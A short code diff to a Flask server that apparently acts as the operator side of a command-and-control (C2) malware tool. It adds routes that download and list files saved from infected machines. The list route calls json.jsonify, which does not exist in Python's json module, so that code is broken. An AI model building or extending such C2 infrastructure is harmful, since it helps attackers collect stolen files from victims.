@@ -3,6 +3,7 @@ import eventlet
 import socketio
 from c2 import C2
 import os
+import json
 
 
 app = Flask(__name__)
@@ -109,6 +110,16 @@ def download_file():
     data = request.get_json()
     malware.download_file(data)
     return ""
+
+
+@app.route('/get_downloaded_files/<path:filename>')
+def get_payloads(filename):
+    return send_from_directory('files_saved', filename, as_attachment=True)
+
+
+@app.route('/list_files', methods=['POST'])
+def list_payloads():
+    return json.jsonify(str(os.listdir('files_saved')))
 
 
 
